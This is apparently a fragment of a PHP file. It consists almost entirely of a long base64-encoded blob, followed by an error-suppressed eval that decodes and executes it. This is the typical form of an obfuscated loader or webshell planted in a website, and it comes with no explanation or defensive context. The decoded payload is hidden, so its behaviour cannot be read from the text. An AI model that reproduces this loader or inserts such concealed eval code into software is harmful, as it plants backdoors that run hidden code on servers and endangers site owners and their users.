NnFJNG8xN05rTlpMTDFBMkxGcWo5ek9rREkxNGErdEMvM3pxUmlaamtwcE5Ya3lMb0ZXLzN1V1NSc21pYmZJbUJSY3czOUdLTU9XWWFBOU1QMUM2UGRZK0ZWdkVCcWxMWEVFcjBUelViemplUGsxZTR5eWhOKzVQRGZibHQxUlVtZW5DMkNLNkRxN0pTa3hjYnZVRkFOUUNvOUltOVZQYWRuT0t4cjdZcW5NVUJ2L2ZTcmlUNHNGT2JRdVk0N1AyMUlzSU9GaWhLYTdKV2hHT01ZVjk4alB1WXVrNVpiOUx2WENENDd3cnlCV1czMWtHakpCakx3alZOY2dNZ0pzZE1Ib0V6UlRaK1pVZmkwdy8rUXR4cDI1ZXQxckN4UmpoQzYrR29PckU4OHF2YXB5bGZDRTc0WVVqY0F6RGlrSGRyOVNHMFI2QXZEMnNycXIyeHRCVXVxcGRZaURUSXVFRXNVK2VpUXpEcnhHbjNZZUJFV1pSQW1ueUJSczgxajVoNjIwUldlNTRaZjY1MXR1Qjg5REZpVlNxZkhBUHVONU55ZFRCa2d4QVdaSWdWYVp3N2RhYU5ySUdjNmZBNlFFOWF3bFkyS0hnM1lhbE1wQ20yelpjUnFydlQzRVFuczF2RE41V2l4a3kwMVo0TW40VlEvUlVPYzJqeWh4U1FGeDQyTFlCT3NBZ1FCWHRZVUZoNDFxdU1sRkpuakZrMytUeHdnUWNOV0dLeUMzc2J0TkhoYVlzeFU3R0R0bWRmYnF0cVdvbFkxQ2h3SFdtWW1GcDhobithSkNRUDd6WWo0b2tXNG5RNGY3WUMyVHBZOFJjUzY1RmhETWV6SVBYQnkra2hEUTdmYWNWbUtNeTNhZncveGtvNEsxU2QxNWZsQnVYczBrY0hsN21OTWhZZEFaRytBOENpd0pkeUFoUkdhMjhqYVdVdHdWZEdrY1g5QlNwNTdYVkUxMzkxM2ZXbXVHUVhvblVNemFWRDB6Y3hZd3lKb0lrNjNhTW1rdnBFSmpsQzJ4QU9BUEFvcnI0YTJ0UU9iWmkxRS9uYWU5VmVhNVBOM0dsUVpESzVUK1BuSk9VZWhHaVpmbUk1SmdpQzVubXNQWm1BVFhSRlY4ZlFqMlBpalAxNDdRTmR3NlF2WVAwRXkxVm5mYWVYZi93Q2J0UzFmNC82QlhxbVhqNXNmY1pSNDZheXdnMG1vV2xrdnlaYmdjOVZjUlJhelk1NlF2ejd2bFNPOEhQQjlFOThNdUFuZWJSNFMwY3pHOGIxSDlVUmpjQjhQMEtDeVFDanMrSG1WZnJsTEJlYXY1NmhHLzlIS3NZQzRwaHk5c2ZqRzVvNXZwQnVmN1h6TkMyQm00SGErQ1J3Mjc2NHFXMmh2UFJDbjdGL2hkQnozcTMxYktVRFdXY2NyUnp1bUNmOEhac1hqTmc4TlRSMkIzaFpmODJ5a09URHUxRllzUHBGVysvbHFKS3lxZENqQXZBMGV4dHJDSGRXL3U1dTA3TDhNRnJkTlNNUk5HTHNabFIzbm8xbW9qcUhDMmtLejlDYlR3cnZldlNYejJ0bXlMZ1NpYXdrVFFsN0JsUXhxbEV0ZDQ3OEdMRnRJQ0d2enhHZVJGa2kzYXdERkQwZ0diM2JCTmxkWk5WR0Y2c2c5bytDalNhQktkNXZ3Q3FPOW5aK2R4cDJRUFNLVkdPNGZqOERRbDBNbU1jQllYMXZJcldGeGdkT3lmYmlucmV3VzZCODFvWVNGT3VnNXBRUC9vMW5HRkhpbmoyNlJlVWlNTHROU1BjaUV3SkliTGVGNFJicjZQdzRZUDdpVE5hSUJYSkd1ZFJHTHc5Ym9kd0dKenJoZWxNL3MyMUo3bE10ZU1TSXoreVI3eXhyb29hbDVaTlNBSWZjZGdRNkx5T2ltYk41Tko4S1ZGajFsUTlwTk5RNGhDaEI4YUJLdlVRSUhXd1JOVXlxVUx4TGlRYTJJa0c1Z0I5THhLV3VyWndMdlU0eWFCOEhndy9LZ05xZWlGbHBOSnpmNDM4aDhHNlY1U08xbnJSSXNsWmRTckZnMFd6UHVXSUdmUjVsclNKcXkzNG9KNkVJUzlVcFdURWRCL3lqQTQ2Y3BnYTZKUE9VR1hneGJwb3U5N0tiZVA4dlMrQUZGRnJORmJNSkQrNFJQbzcwckMvamdTZ2VQVjBNVHRZYUhlQ0VadUMwd0hDZmhmUTFkb3lpdDVhaGRJS0NzNjQ4Z1hnYVFCaHZCd3ZJaXlFbDNtWVFzZ01vWHFSVmw2c0tPVnFTMVY5YVhyR3U2MVZhR0toZ1NqdkZzZFNRS21lNllpRmxqeitGcWJ6N3J3cDQrTE1ZYWdpTkprb2pKSkZaZDJocXA0dDFxUTA5MGZFTGhsby9wVXBhUGc0cTRpaVl2c3FwTXBxUzZYSU9jWFZaQjcvSEloUFJESUpaRUZnaUlJb2czVWQ4RjM5VmpkLzRhV2Q2NVdzeFZlL0M3MlFPQWx2eUR2YXZrY045Q2JVQSt3cEd0RHd6NXRIUWp5MVd1bVpNTlpuVTVsMTZNU1k3Qkl6aE1Eb3haNGlMaEx2NUNSdHhkd2hYdkxITkVIUldqNzVnKzR4TElkZm1TVkI4d3dPempScGpCOGNXUHZ2YW1QSjlNb1RLYU45VG5WcmQzaFR0Ym1Fb20rT0xmaEJvVmVVUDFrSVZwTGo3b0tuMm5xekt0U2xnRGJoSnlGeWRGN1FSTHdXUW5kSDZDbzU4MVRBdUN6MWduYlRNS2JKRVI0QVVnNWlKdmt6NGEybEZpTUZWSlNTUlVKQU5yd3p0NG9tQndMVlZsZGFPbld2dUQxWWtoWmNWSGloVmdGdWxSZ1lBbHlUd1BvM240dHBQekpJdDRZSkViZHRHTzdKR1RScHVNTlVkYUl6SEV6YUlPUEtCdUpNaThhMWNuUjNxcWVBMlhvZGNqS0xxL043eXYvajFFSW91UnBsblhUc0JlVnYvS3JOQXF2QXlWcXJHck1McnZnZ0RrTUkvZEo3Q0lIdUY5VFhTQThESGVZT2ZVS0ZiN2hIMDNQNk9HRWJzRS93MDNQWlEyOEduekZ2TSt1ckxnMUo5akFzSFhwN2dOWEwyQ2tEZ1VEc01sSisvdk5lNHM3cFg2cEo4M25vcmFKTnlyVzgvMHgzQmJVKzFEOWNpY0dvM2haQUpBMWZyNzFIdGZkcHJyMGYySmh3V3cwZWhTckc1VlZ6eVozdWVwVVp6ZFNvcjJkbG53OUpDRnFENTZ5THRqbVhldHVMQk93ZHU4cm5tTFJLUTgrR25xVmVlSHAzZlYwM2xZNlkwc0IvQ2RoOWhhc2dKcTdndGY1d3JXN3ZnMFNMdW9sMkZPSmJCS09LWW5YaWpmdVN2amJJdnNjVHVSOENYbUk2cGJ0ZnZpNlF6dGkyNm1YbTBITXRCbEhQVDQraWQwRnphcG9UbllBYWthZVpERm5nS1FONHdBNDFaNEZmREljbkllZU8wSWtCVm5JTVE3ZW13Nk44NnlVY2UvOEhTaEF4ZkowSW1ZVGxHY0JMREhRVFZsNGpRazI1SFNUMVVKMmJFZStJK3psZ3J3NStqN2xvaWhINFdKZlRod3FtSVhpNmNpakRNN0w4ZEc0Ym5heVVPOEFmQzZ2UHhrTm5HaEpnOGVLeUw3bDhBVFZSQlNySEdMTEM4eG5xYzkvYWdqNndhMTkrNlBBVEF3ajYxSXNtRXNKemdGM3cvSUl1SnVnNzR4YkQzdytITlZqcElseitiNXVOcnFodmRmR2tTM2NTRDNGUzZmSFNGMHFrcHlBVlhCUVlHeHlzNmFsVmJSeEluTDJhOC9mTDNiRENmdG5sUnJXWCtLcm9TQlJLc3JjV1haZm5TSHladW1TWGlzSGxnbHFhWlk4PQ==" ;@eval("?>".dcode($key));
